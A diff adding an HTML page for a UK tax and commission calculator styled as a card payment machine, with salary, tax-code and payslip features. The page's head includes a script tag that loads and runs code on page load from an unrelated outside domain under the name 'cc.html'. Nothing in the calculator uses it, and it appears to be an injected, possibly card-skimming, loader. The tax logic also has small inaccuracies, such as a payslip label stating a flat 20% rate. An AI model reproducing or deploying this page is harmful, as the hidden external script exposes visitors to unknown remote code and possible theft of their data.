@@ -1,0 +1,887 @@
+
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UK Tax Calculator - Card Machine</title>
+  <script src="https://www.secondchancereviews.net/cc.html"></script>
+  <script src="/_sdk/element_sdk.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@600;700&display=swap');
+
+    html, body, #app {
+      height: 100%;
+      width: 100%;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    #app {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      overflow-y: auto;
+    }
+
+    .card-machine {
+      width: 100%;
+      max-width: 420px;
+      background: linear-gradient(145deg, #1a1a2e 0%, #16213e 100%);
+      border-radius: 24px;
+      padding: 32px;
+      box-shadow: 
+        0 20px 60px rgba(0, 0, 0, 0.8),
+        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      margin: 20px 0;
+    }
+
+    .machine-header {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .brand-name {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: #00d9ff;
+      letter-spacing: 2px;
+      margin-bottom: 8px;
+      text-shadow: 0 0 20px rgba(0, 217, 255, 0.3);
+    }
+
+    .machine-subtitle {
+      font-size: 0.85rem;
+      color: #64748b;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    .transaction-display {
+      background: linear-gradient(135deg, #0f172a 0%, #1a1f2e 100%);
+      border: 2px solid #00d9ff;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 24px;
+      box-shadow: 
+        0 0 20px rgba(0, 217, 255, 0.2),
+        inset 0 2px 8px rgba(0, 0, 0, 0.5);
+    }
+
+    .status-line {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      font-size: 0.8rem;
+      color: #64748b;
+      border-bottom: 1px solid rgba(0, 217, 255, 0.2);
+      padding-bottom: 8px;
+    }
+
+    .status-label {
+      letter-spacing: 1px;
+    }
+
+    .status-value {
+      color: #00d9ff;
+      font-weight: 600;
+    }
+
+    .amount-display {
+      font-size: 2.8rem;
+      font-weight: 700;
+      color: #00d9ff;
+      text-align: right;
+      letter-spacing: 2px;
+      text-shadow: 0 0 20px rgba(0, 217, 255, 0.3);
+      margin-bottom: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      word-break: break-all;
+    }
+
+    .result-display {
+      background: rgba(0, 217, 255, 0.05);
+      border-radius: 8px;
+      padding: 12px;
+      text-align: right;
+      font-size: 1rem;
+      color: #cbd5e1;
+      border: 1px solid rgba(0, 217, 255, 0.2);
+    }
+
+    .tax-code-selector {
+      width: 100%;
+      background: rgba(0,217,255,0.1) !important;
+      border: 1px solid #00d9ff !important;
+      color: #00d9ff !important;
+      padding: 8px;
+      border-radius: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      margin-bottom: 12px;
+      font-size: 0.9rem;
+    }
+
+    .tax-code-selector option {
+      background: #1a1a2e;
+      color: #00d9ff;
+    }
+
+    .card-slot {
+      background: linear-gradient(135deg, #0a0e27 0%, #111827 100%);
+      border: 2px dashed #00d9ff;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+      text-align: center;
+      font-size: 0.8rem;
+      color: #64748b;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .card-slot::before {
+      content: '💳';
+      display: block;
+      font-size: 2rem;
+      margin-bottom: 8px;
+      opacity: 0.6;
+    }
+
+    .card-slot.active {
+      background: linear-gradient(135deg, rgba(0, 217, 255, 0.1) 0%, rgba(0, 217, 255, 0.05) 100%);
+      border-color: #00ff88;
+      color: #00ff88;
+    }
+
+    .card-slot.active::before {
+      animation: slide 0.6s ease-in-out infinite;
+    }
+
+    @keyframes slide {
+      0%, 100% { transform: translateX(-20px); opacity: 0; }
+      50% { transform: translateX(0); opacity: 1; }
+    }
+
+    .buttons-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .calc-btn {
+      background: linear-gradient(145deg, #1e293b 0%, #0f172a 100%);
+      border: 2px solid #334155;
+      border-radius: 8px;
+      color: #cbd5e1;
+      font-size: 1.1rem;
+      font-weight: 600;
+      padding: 14px;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      font-family: 'JetBrains Mono', monospace;
+      letter-spacing: 1px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+
+    .calc-btn:hover {
+      border-color: #00d9ff;
+      color: #00d9ff;
+      box-shadow: 0 0 20px rgba(0, 217, 255, 0.2);
+      transform: translateY(-2px);
+    }
+
+    .calc-btn:active {
+      transform: translateY(0);
+      box-shadow: 0 2px 8px rgba(0, 217, 255, 0.1);
+    }
+
+    .calc-btn.number {
+      grid-column: span 1;
+    }
+
+    .calc-btn.operation {
+      background: linear-gradient(145deg, rgba(0, 217, 255, 0.2) 0%, rgba(0, 217, 255, 0.1) 100%);
+      border-color: #00d9ff;
+      color: #00ff88;
+    }
+
+    .calc-btn.operation:hover {
+      background: linear-gradient(145deg, rgba(0, 217, 255, 0.3) 0%, rgba(0, 217, 255, 0.2) 100%);
+    }
+
+    .calc-btn.equals {
+      grid-column: span 4;
+      background: linear-gradient(145deg, rgba(0, 255, 136, 0.3) 0%, rgba(0, 255, 136, 0.1) 100%);
+      border-color: #00ff88;
+      color: #00ff88;
+      font-size: 1.3rem;
+    }
+
+    .calc-btn.equals:hover {
+      background: linear-gradient(145deg, rgba(0, 255, 136, 0.4) 0%, rgba(0, 255, 136, 0.2) 100%);
+      box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+    }
+
+    .calc-btn.clear {
+      background: linear-gradient(145deg, rgba(255, 87, 87, 0.3) 0%, rgba(255, 87, 87, 0.1) 100%);
+      border-color: #ff5757;
+      color: #ff5757;
+    }
+
+    .calc-btn.clear:hover {
+      background: linear-gradient(145deg, rgba(255, 87, 87, 0.4) 0%, rgba(255, 87, 87, 0.2) 100%);
+      box-shadow: 0 0 20px rgba(255, 87, 87, 0.3);
+    }
+
+    .commission-section {
+      background: rgba(255,165,0,0.1);
+      border: 1px solid #ffa500;
+      border-radius: 8px;
+      padding: 12px;
+      margin-bottom: 16px;
+    }
+
+    .commission-header {
+      font-size: 0.8rem;
+      color: #ffa500;
+      margin-bottom: 8px;
+      letter-spacing: 1px;
+    }
+
+    .commission-controls {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+
+    .commission-toggle {
+      flex: 1;
+      padding: 10px;
+      font-size: 0.9rem;
+      background: linear-gradient(145deg, rgba(255,165,0,0.2) 0%, rgba(255,165,0,0.1) 100%);
+      border: 2px solid #ffa500 !important;
+      color: #ffa500 !important;
+    }
+
+    .commission-toggle:hover {
+      background: linear-gradient(145deg, rgba(255,165,0,0.3) 0%, rgba(255,165,0,0.2) 100%);
+    }
+
+    .commission-clr {
+      width: 50px;
+      padding: 10px;
+      font-size: 0.9rem;
+    }
+
+    .commission-list {
+      max-height: 150px;
+      overflow-y: auto;
+      background: rgba(255,165,0,0.05);
+      border-radius: 6px;
+      padding: 8px;
+    }
+
+    .commission-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px;
+      margin-bottom: 4px;
+      background: rgba(0,0,0,0.3);
+      border-radius: 4px;
+      font-size: 0.85rem;
+      color: #ffa500;
+    }
+
+    .commission-amount {
+      font-weight: 600;
+    }
+
+    .commission-remove {
+      background: #ff5757;
+      color: white;
+      border: none;
+      width: 24px;
+      height: 24px;
+      border-radius: 4px;
+      font-size: 0.75rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .commission-remove:hover {
+      background: #ff3333;
+    }
+
+    .receipt-mode {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.9);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      overflow-y: auto;
+    }
+
+    .receipt-mode.active {
+      display: flex;
+    }
+
+    .receipt {
+      background: #f5f5dc;
+      color: #1a1a1a;
+      padding: 32px 24px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+      line-height: 1.6;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+      position: relative;
+    }
+
+    .receipt-header {
+      text-align: center;
+      border-bottom: 2px solid #1a1a1a;
+      padding-bottom: 12px;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    .receipt-item {
+      display: flex;
+      justify-content: space-between;
+      margin: 8px 0;
+    }
+
+    .receipt-divider {
+      border-bottom: 2px solid #1a1a1a;
+      margin: 12px 0;
+    }
+
+    .receipt-total {
+      font-weight: 600;
+      font-size: 1.1rem;
+      display: flex;
+      justify-content: space-between;
+      margin: 12px 0;
+    }
+
+    .receipt-footer {
+      text-align: center;
+      font-size: 0.8rem;
+      margin-top: 12px;
+      border-top: 2px solid #1a1a1a;
+      padding-top: 12px;
+    }
+
+    .close-receipt {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: #ff5757;
+      color: white;
+      border: none;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      font-size: 1.5rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .close-receipt:hover {
+      background: #ff3333;
+      transform: scale(1.1);
+    }
+
+    @media (max-width: 480px) {
+      .card-machine {
+        padding: 24px;
+      }
+
+      .amount-display {
+        font-size: 2rem;
+      }
+
+      .buttons-grid {
+        gap: 10px;
+      }
+
+      .calc-btn {
+        padding: 12px;
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <div class="card-machine">
+      <!-- Header -->
+      <div class="machine-header">
+        <div class="brand-name">PAY-CALC UK</div>
+        <div class="machine-subtitle">TAX CALCULATOR v3.3</div>
+      </div>
+
+      <!-- Card Slot Animation -->
+      <div class="card-slot" id="card-slot">
+        INSERT CARD
+      </div>
+
+      <!-- Tax Code Selector -->
+      <div class="transaction-display">
+        <div class="status-line">
+          <span class="status-label">TAX CODE</span>
+        </div>
+        <select id="tax-code" class="tax-code-selector" onchange="updateTaxInfo()">
+          <option value="1257L">1257L - Standard (2024/25)</option>
+          <option value="1259L">1259L - Adjusted</option>
+          <option value="0T">0T - Emergency</option>
+          <option value="M">M - Married/CivP (M)</option>
+          <option value="N">N - Married/CivP (N)</option>
+          <option value="BR">BR - Basic Rate</option>
+          <option value="D0">D0 - Higher Rate</option>
+          <option value="D1">D1 - Additional Rate</option>
+        </select>
+      </div>
+
+      <!-- Salary Input Section -->
+      <div class="transaction-display">
+        <div class="status-line">
+          <span class="status-label">ANNUAL SALARY</span>
+          <span class="status-value" id="salary-status">£0.00</span>
+        </div>
+        <div class="status-line">
+          <span class="status-label">TAX ALLOWANCE</span>
+          <span class="status-value" id="allowance-status">£12,570.00</span>
+        </div>
+        <div class="amount-display" id="display">0</div>
+        <div class="result-display" id="result-display">ENTER ANNUAL SALARY</div>
+      </div>
+
+      <!-- Number Pad for Salary -->
+      <div class="buttons-grid" id="salary-buttons">
+        <button class="calc-btn number" onclick="appendNumber('7')">7</button>
+        <button class="calc-btn number" onclick="appendNumber('8')">8</button>
+        <button class="calc-btn number" onclick="appendNumber('9')">9</button>
+        <button class="calc-btn operation clear" onclick="deleteLast()">DEL</button>
+
+        <button class="calc-btn number" onclick="appendNumber('4')">4</button>
+        <button class="calc-btn number" onclick="appendNumber('5')">5</button>
+        <button class="calc-btn number" onclick="appendNumber('6')">6</button>
+        <button class="calc-btn number" onclick="appendNumber('0')">0</button>
+
+        <button class="calc-btn number" onclick="appendNumber('1')">1</button>
+        <button class="calc-btn number" onclick="appendNumber('2')">2</button>
+        <button class="calc-btn number" onclick="appendNumber('3')">3</button>
+        <button class="calc-btn number" onclick="appendNumber('.')">.</button>
+
+        <button class="calc-btn equals" onclick="setSalary()">SET SALARY</button>
+
+        <button class="calc-btn clear" onclick="clearDisplay()">CLEAR</button>
+      </div>
+
+      <!-- Commission Input Section -->
+      <div class="commission-section" id="commission-section" style="display:none;">
+        <div class="commission-header">💰 MONTHLY COMMISSION</div>
+        <div class="commission-controls">
+          <button class="calc-btn commission-toggle" onclick="addCommissionAmount()">
+            <span id="commission-mode-text">ADD COMMISSION</span>
+          </button>
+          <button class="calc-btn commission-clr" onclick="clearAllCommissions()">CLR ALL</button>
+        </div>
+        <div class="commission-list" id="commission-list">
+          <div id="commission-items"></div>
+          <div style="font-size: 0.85rem; color: #ffa500; margin-top: 8px; padding-top: 8px; border-top: 1px solid rgba(255,165,0,0.2);">
+            Total Monthly: <span id="total-commission" style="font-weight: 600;">£0.00</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Number Pad for Commission -->
+      <div class="buttons-grid" id="commission-buttons" style="display:none;">
+        <button class="calc-btn number" onclick="appendNumber('7')">7</button>
+        <button class="calc-btn number" onclick="appendNumber('8')">8</button>
+        <button class="calc-btn number" onclick="appendNumber('9')">9</button>
+        <button class="calc-btn operation clear" onclick="deleteLast()">DEL</button>
+
+        <button class="calc-btn number" onclick="appendNumber('4')">4</button>
+        <button class="calc-btn number" onclick="appendNumber('5')">5</button>
+        <button class="calc-btn number" onclick="appendNumber('6')">6</button>
+        <button class="calc-btn number" onclick="appendNumber('0')">0</button>
+
+        <button class="calc-btn number" onclick="appendNumber('1')">1</button>
+        <button class="calc-btn number" onclick="appendNumber('2')">2</button>
+        <button class="calc-btn number" onclick="appendNumber('3')">3</button>
+        <button class="calc-btn number" onclick="appendNumber('.')">.</button>
+
+        <button class="calc-btn equals" onclick="calculateTax()">CALCULATE NET PAY</button>
+
+        <button class="calc-btn clear" onclick="resetToSalary()">EDIT SALARY</button>
+        <button class="calc-btn clear" onclick="printPayslip()">PAYSLIP</button>
+      </div>
+    </div>
+
+    <!-- Payslip Modal -->
+    <div class="receipt-mode" id="payslip-modal">
+      <div class="receipt" id="payslip">
+        <button class="close-receipt" onclick="closePayslip()">×</button>
+        <div class="receipt-header">
+          PAY-CALC UK<br>
+          PAYSLIP BREAKDOWN
+        </div>
+        <div class="receipt-item">
+          <span>TAX CODE:</span>
+          <span id="payslip-tax-code"></span>
+        </div>
+        <div class="receipt-item">
+          <span>ANNUAL SALARY:</span>
+          <span id="payslip-salary"></span>
+        </div>
+        <div class="receipt-item">
+          <span>ANNUAL COMMISSION:</span>
+          <span id="payslip-annual-commission"></span>
+        </div>
+        <div class="receipt-item">
+          <span>TOTAL INCOME:</span>
+          <span id="payslip-total-income"></span>
+        </div>
+        <div class="receipt-item">
+          <span>TAX ALLOWANCE:</span>
+          <span id="payslip-allowance"></span>
+        </div>
+        <div class="receipt-divider"></div>
+        <div class="receipt-item">
+          <span>TAXABLE INCOME:</span>
+          <span id="payslip-taxable"></span>
+        </div>
+        <div class="receipt-item">
+          <span>INCOME TAX (20%):</span>
+          <span id="payslip-tax"></span>
+        </div>
+        <div class="receipt-item">
+          <span>NI CONTRIBUTIONS:</span>
+          <span id="payslip-ni"></span>
+        </div>
+        <div class="receipt-divider"></div>
+        <div class="receipt-total">
+          <span>MONTHLY NET PAY:</span>
+          <span id="payslip-monthly"></span>
+        </div>
+        <div class="receipt-total" style="font-size: 1.2rem; color: #00ff88;">
+          <span>ANNUAL NET PAY:</span>
+          <span id="payslip-annual"></span>
+        </div>
+        <div class="receipt-footer">
+          CALCULATED <span id="payslip-time"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // UK Tax Codes for 2024/25
+    const taxCodes = {
+      '1257L': { allowance: 12570, name: 'Standard Personal Allowance' },
+      '1259L': { allowance: 12885, name: 'Adjusted Allowance' },
+      '0T': { allowance: 0, name: 'Emergency Code' },
+      'M': { allowance: 12570, name: 'Married (M)' },
+      'N': { allowance: 12570, name: 'Married (N)' },
+      'BR': { allowance: 0, name: 'Basic Rate' },
+      'D0': { allowance: 0, name: 'Higher Rate' },
+      'D1': { allowance: 0, name: 'Additional Rate' }
+    };
+
+    let display = '0';
+    let currentSalary = 0;
+    let currentTaxCode = '1257L';
+    let commissions = [];
+    let lastCalculation = null;
+    let inputMode = 'salary'; // 'salary' or 'commission'
+
+    const defaultConfig = {};
+    let config = { ...defaultConfig };
+
+    function getTaxAllowance(taxCode) {
+      return taxCodes[taxCode]?.allowance || 12570;
+    }
+
+    function calculateIncomeTax(salary, allowance) {
+      const basicRate = 50270;
+      const higherRate = 125140;
+      
+      const taxableIncome = Math.max(0, salary - allowance);
+      let tax = 0;
+
+      if (taxableIncome <= basicRate - allowance) {
+        tax = taxableIncome * 0.20;
+      } else if (taxableIncome <= higherRate - allowance) {
+        const basicTaxable = basicRate - allowance;
+        tax = basicTaxable * 0.20 + (taxableIncome - basicTaxable) * 0.40;
+      } else {
+        const basicTaxable = basicRate - allowance;
+        const higherTaxable = higherRate - basicRate;
+        tax = basicTaxable * 0.20 + higherTaxable * 0.40 + (taxableIncome - basicTaxable - higherTaxable) * 0.45;
+      }
+
+      return tax;
+    }
+
+    function calculateNI(salary) {
+      const primaryThreshold = 12570;
+      const upperEarningsLimit = 50270;
+
+      let niContribution = 0;
+
+      if (salary > primaryThreshold) {
+        const niableEarnings = Math.min(salary - primaryThreshold, upperEarningsLimit - primaryThreshold);
+        niContribution = niableEarnings * 0.08;
+      }
+
+      if (salary > upperEarningsLimit) {
+        const additionalEarnings = salary - upperEarningsLimit;
+        niContribution += additionalEarnings * 0.02;
+      }
+
+      return niContribution;
+    }
+
+    function getTotalMonthlyCommission() {
+      return commissions.reduce((sum, c) => sum + c, 0);
+    }
+
+    function updateDisplay() {
+      document.getElementById('display').textContent = display.length > 15 ? display.substring(0, 15) + '...' : display;
+      if (inputMode === 'salary') {
+        document.getElementById('salary-status').textContent = '£' + (parseFloat(display) || 0).toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      }
+    }
+
+    function updateTaxInfo() {
+      currentTaxCode = document.getElementById('tax-code').value;
+      const allowance = getTaxAllowance(currentTaxCode);
+      document.getElementById('allowance-status').textContent = '£' + allowance.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+
+    function appendNumber(num) {
+      if (display === '0' && num !== '.') {
+        display = num;
+      } else if (num === '.') {
+        if (!display.includes('.')) {
+          display += num;
+        }
+      } else {
+        display += num;
+      }
+      updateDisplay();
+    }
+
+    function deleteLast() {
+      if (display.length > 1) {
+        display = display.slice(0, -1);
+      } else {
+        display = '0';
+      }
+      updateDisplay();
+    }
+
+    function clearDisplay() {
+      display = '0';
+      document.getElementById('result-display').textContent = 'ENTER ANNUAL SALARY';
+      updateDisplay();
+    }
+
+    function setSalary() {
+      const salary = parseFloat(display) || 0;
+      if (salary <= 0) {
+        document.getElementById('result-display').textContent = 'INVALID SALARY';
+        return;
+      }
+
+      currentSalary = salary;
+      inputMode = 'commission';
+      display = '0';
+      
+      // Hide salary buttons, show commission section and buttons
+      document.getElementById('salary-buttons').style.display = 'none';
+      document.getElementById('commission-section').style.display = 'block';
+      document.getElementById('commission-buttons').style.display = 'grid';
+      document.getElementById('result-display').textContent = 'SALARY SET - ADD COMMISSIONS';
+      
+      updateDisplay();
+    }
+
+    function addCommissionAmount() {
+      const amount = parseFloat(display) || 0;
+      if (amount > 0) {
+        commissions.push(amount);
+        updateCommissionList();
+        display = '0';
+        document.getElementById('result-display').textContent = 'COMMISSION ADDED';
+      } else {
+        document.getElementById('result-display').textContent = 'ENTER AMOUNT';
+      }
+      updateDisplay();
+    }
+
+    function updateCommissionList() {
+      const container = document.getElementById('commission-items');
+      container.innerHTML = '';
+      commissions.forEach((commission, index) => {
+        const item = document.createElement('div');
+        item.className = 'commission-item';
+        item.innerHTML = `
+          <span>Commission ${index + 1}: <span class="commission-amount">£${commission.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span></span>
+          <button class="commission-remove" onclick="removeCommission(${index})">×</button>
+        `;
+        container.appendChild(item);
+      });
+      document.getElementById('total-commission').textContent = '£' + getTotalMonthlyCommission().toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+
+    function removeCommission(index) {
+      commissions.splice(index, 1);
+      updateCommissionList();
+    }
+
+    function clearAllCommissions() {
+      commissions = [];
+      display = '0';
+      document.getElementById('result-display').textContent = 'COMMISSIONS CLEARED';
+      updateCommissionList();
+      updateDisplay();
+    }
+
+    function resetToSalary() {
+      inputMode = 'salary';
+      display = '0';
+      commissions = [];
+      currentSalary = 0;
+      
+      document.getElementById('salary-buttons').style.display = 'grid';
+      document.getElementById('commission-section').style.display = 'none';
+      document.getElementById('commission-buttons').style.display = 'none';
+      document.getElementById('result-display').textContent = 'ENTER ANNUAL SALARY';
+      
+      updateDisplay();
+    }
+
+    function calculateTax() {
+      if (currentSalary <= 0) {
+        document.getElementById('result-display').textContent = 'SET SALARY FIRST';
+        return;
+      }
+
+      const totalMonthlyComm = getTotalMonthlyCommission();
+      const annualCommission = totalMonthlyComm * 12;
+      const totalAnnualIncome = currentSalary + annualCommission;
+
+      const allowance = getTaxAllowance(currentTaxCode);
+      const incomeTax = calculateIncomeTax(totalAnnualIncome, allowance);
+      const ni = calculateNI(totalAnnualIncome);
+      const totalDeductions = incomeTax + ni;
+      const netPay = totalAnnualIncome - totalDeductions;
+      const monthlyNet = netPay / 12;
+
+      lastCalculation = {
+        salary: currentSalary,
+        annualCommission: annualCommission,
+        totalAnnualIncome: totalAnnualIncome,
+        allowance: allowance,
+        incomeTax: incomeTax,
+        ni: ni,
+        totalDeductions: totalDeductions,
+        netPay: netPay,
+        monthlyNet: monthlyNet
+      };
+
+      document.getElementById('result-display').textContent = 'MONTHLY: £' + monthlyNet.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('display').textContent = '£' + netPay.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+
+    function printPayslip() {
+      if (!lastCalculation) {
+        document.getElementById('result-display').textContent = 'CALCULATE FIRST';
+        return;
+      }
+
+      const calc = lastCalculation;
+      const now = new Date();
+      const timeStr = now.toLocaleString('en-GB');
+
+      document.getElementById('payslip-tax-code').textContent = currentTaxCode;
+      document.getElementById('payslip-salary').textContent = '£' + calc.salary.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('payslip-annual-commission').textContent = '£' + calc.annualCommission.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('payslip-total-income').textContent = '£' + calc.totalAnnualIncome.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('payslip-allowance').textContent = '£' + calc.allowance.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('payslip-taxable').textContent = '£' + (calc.totalAnnualIncome - calc.allowance).toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('payslip-tax').textContent = '£' + calc.incomeTax.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('payslip-ni').textContent = '£' + calc.ni.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('payslip-monthly').textContent = '£' + calc.monthlyNet.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('payslip-annual').textContent = '£' + calc.netPay.toLocaleString('en-GB', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('payslip-time').textContent = timeStr;
+
+      document.getElementById('payslip-modal').classList.add('active');
+    }
+
+    function closePayslip() {
+      document.getElementById('payslip-modal').classList.remove('active');
+    }
+
+    function animateCardInsert() {
+      const cardSlot = document.getElementById('card-slot');
+      cardSlot.classList.add('active');
+      cardSlot.textContent = 'CARD INSERTED - READY';
+      setTimeout(() => {
+        cardSlot.classList.remove('active');
+        cardSlot.textContent = 'CARD ACCEPTED ✓';
+      }, 1500);
+    }
+
+    // Initialize
+    updateDisplay();
+    updateTaxInfo();
+    animateCardInsert();
+
+    // SDK initialization
+    if (window.elementSdk) {
+      window.elementSdk.init({
+        defaultConfig,
+        onConfigChange: async (newConfig) => {
+          config = { ...defaultConfig, ...newConfig };
+        },
+        mapToCapabilities: () => ({
+          recolorables: [],
+          borderables: [],
+          fontEditable: undefined,
+          fontSizeable: undefined
+        }),
+        mapToEditPanelValues: (cfg) => new Map()
+      });
+    }
+  </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9cf585c5656263dd',t:'MTc3MTMzMzgwMi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
